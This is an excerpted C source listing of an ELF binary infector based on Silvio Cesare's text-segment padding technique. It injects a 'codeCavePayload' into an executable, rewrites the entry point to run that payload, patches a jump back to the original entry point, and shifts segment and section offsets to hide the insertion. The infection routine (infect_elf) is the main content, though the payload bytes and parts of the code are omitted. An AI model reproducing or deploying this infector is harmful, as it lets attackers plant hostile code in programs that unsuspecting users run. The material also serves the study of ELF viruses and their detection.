...
#define codeCavePayload BITS(codeCavePayload)
#define init_codeCavePayload BITS(init_codeCavePayload)
...
void init_codeCavePayload(unsigned char *code, Elf_Addr jmp_vaddr, Elf_Addr entry) {
    memcpy(code, codeCavePayload, sizeof(codeCavePayload)-1);
    *(int*)&jmp_entry[1] = entry - (jmp_vaddr + 5);
    memcpy(code+sizeof(codeCavePayload)-1, jmp_entry, sizeof(jmp_entry)-1);
}
...
/* Silvio's algorithm:
    ...
    * Patch the insertion code (codeCavePayload) to jump to the entry point (original)
    * Locate the text segment program header
        * Modify the entry point of the ELF header to point to the new
        code (p_vaddr + p_filesz)
        * Increase p_filesz by account for the new code (codeCavePayload)
        * Increase p_memsz to account for the new code (codeCavePayload)
    * For each phdr who's segment is after the insertion (text segment)
        * increase p_offset by PAGE_SIZE
    * For the last shdr in the text segment
        * increase sh_size by the codeCavePayload length
    * For each shdr who's section resides after the insertion
        * Increase sh_offset by PAGE_SIZE
    * Physically insert the new code (codeCavePayload) and pad to PAGE_SIZE, into
...
int infect_elf(int fd, int fdout) {
    ...
    psz = sizeof(codeCavePayload) + sizeof(jmp_entry) - 2;
    printf("[+] codeCavePayload size: %zu bytes\n", psz);
    ...
    for (i=0; i<ehdr.e_phnum; i++)
        if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0) { // Locate the text segment program header
            ...
            if (next_phdr != NULL && phdr[i].p_vaddr + phdr[i].p_memsz + psz >= next_phdr->p_vaddr) {
                fprintf(stderr, "[-] File does not have enough space for the codeCavePayload\n");
                goto _fatal;
            ...
            if (psz > padsz) {
                printf("[-] codeCavePayload size > padding size .. codeCave will fix some values\n");
    ...
    // Patch the insertion code (codeCavePayload) to jump to the entry point (original)
    printf("[+] Initialize codeCavePayload\n");
    if ((code = malloc(psz)) == NULL)
        __FATAL("malloc");
    init_codeCavePayload(code, ehdr.e_entry + sizeof(codeCavePayload)-1, orig_entry);
    ...
    // Physically insert the new code (codeCavePayload) and pad to PAGE_SIZE
    printf("[+] Write the codeCavePayload\n");
